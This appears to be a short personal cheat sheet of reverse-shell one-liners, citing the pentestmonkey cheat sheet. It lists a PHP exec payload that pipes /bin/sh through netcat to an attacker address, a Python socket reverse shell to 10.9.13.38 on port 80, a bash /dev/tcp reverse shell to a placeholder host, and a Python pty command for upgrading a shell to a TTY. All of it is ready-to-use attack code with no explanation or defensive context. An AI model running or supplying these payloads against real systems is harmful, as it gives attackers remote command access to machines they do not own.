# Reverse Shell
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Simple PHP one-liner
`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackip> <attackport> >/tmp/f")?>`

# Simple python one-liner
`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.9.13.38",80));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`

# Simple bash
#!/bin/bash
bash -i >& /dev/tcp/x.x.x.x/pppp 0>&1

## Shell upgrade to tty
`python -c 'import pty;pty.spawn("/bin/bash")'; #spawn a python psuedo-shell`